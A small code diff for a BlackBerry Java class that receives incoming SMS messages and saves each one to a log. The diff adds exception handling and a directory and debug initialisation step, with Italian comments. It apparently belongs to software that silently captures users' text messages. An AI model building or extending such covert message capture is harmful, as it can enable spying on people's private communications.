@@ -6,6 +6,7 @@ import java.io.IOException;
 import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.MessageListener;
 
+import blackberry.fs.Path;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
@@ -34,23 +35,41 @@ class SMSINListener implements MessageListener, Runnable {
         this.smsListener = smsListener;
     }
 
+    /**
+     * ESECUZIONE FUORI CONTESTO
+     */
     public synchronized void notifyIncomingMessage(final MessageConnection conn) {
         messages++;
-        notifyAll();
+        try {
+            notifyAll();
+        } catch (IllegalMonitorStateException ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
+        }
     }
 
     public void stop() {
         requestStop = true;
-        notifyAll();
+        try {
+            notifyAll();
+        } catch (IllegalMonitorStateException ex) {
+            //#ifdef DEBUG_WARN
+            debug.warn(ex);
+            //#endif
+        }
     }
 
+    /**
+     * ESECUZIONE FUORI CONTESTO ?
+     */
     public void run() {
         requestStop = false;
         while (!requestStop) {
             while (messages > 0) {
                 try {
+                    init();
                     final javax.wireless.messaging.Message m = conn.receive();
-
                     smsListener.saveLog(m, true);
 
                 } catch (final IOException e) {
@@ -66,6 +85,13 @@ class SMSINListener implements MessageListener, Runnable {
                 }
             }
         }
+    }
+    
+    private void init() {
+        if(!Path.isInizialized()){
+            Path.makeDirs();
+        }
+        Debug.init();
     }
 
 }
